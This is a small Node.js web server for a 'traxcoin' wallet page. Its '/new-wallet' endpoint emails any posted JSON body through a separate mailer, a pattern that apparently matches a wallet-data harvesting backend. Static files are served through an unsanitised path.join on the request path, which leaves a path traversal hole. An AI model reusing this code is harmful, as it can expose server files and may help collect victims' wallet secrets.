const http = require("http");
const fs = require("fs");
const path = require("path");
const url = require("url");
const { deliverMail } = require("./mailer.js");
const PORT = process.env.PORT || 3200;
const server = http.createServer((req, res) => {
  const { pathname, query } = url.parse(req.url, true);
  const extension = path.extname(pathname);
  let contentType;
  if (pathname.includes(".")) {
    switch (extension) {
      case ".html":
        contentType = "text/html";
        const htmlPath = path.join(__dirname, pathname);
        fs.readFile(htmlPath, "utf-8", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".css":
        contentType = "text/css";
        const cssPath = path.join(__dirname, pathname);
        fs.readFile(cssPath, "utf-8", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".js":
        contentType = "application/javascript";
        const jsPath = path.join(__dirname, pathname);
        fs.readFile(jsPath, "utf-8", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".jpeg":
        contentType = "image/jpeg";
        const jpegPath = path.join(__dirname, pathname);
        fs.readFile(jpegPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".png":
        contentType = "image/png";
        const pngPath = path.join(__dirname, pathname);
        fs.readFile(pngPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".jpg":
        contentType = "image/jpg";
        const jpgPath = path.join(__dirname, pathname);
        fs.readFile(jpgPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".JPG":
        contentType = "image/jpg";
        const JPGPath = path.join(__dirname, pathname);
        fs.readFile(JPGPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
      case ".svg":
        contentType = "image/svg+xml";
        const svgPath = path.join(__dirname, pathname);
        fs.readFile(svgPath, "", (err, data) => {
          if (err) console.log(err);
          res.writeHead(200, { "Content-Type": contentType });
          res.end(data);
        });
        break;
    }
  }

  if (pathname == "/") {
    const home = path.join(__dirname, "index.html");
    fs.readFile(home, "utf-8", (err, data) => {
      if (err) console.log(err);
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(data);
    });
  }
  if (pathname == "/traxcoin/wallet") {
    const home = path.join(__dirname, "wallet.html");
    fs.readFile(home, "utf-8", (err, data) => {
      if (err) console.log(err);
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(data);
    });
  }
  if (pathname == "/new-wallet") {
    let body;
    req.on("data", (chunk) => {
      body = chunk;
    });
    req.on("end", async () => {
      let resData = JSON.parse(body);
      console.log(await deliverMail(resData));
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ stat: true }));
    });
  }
});

server.listen(PORT, () => {
  console.log(`Server is running at port: ${PORT}`);
});
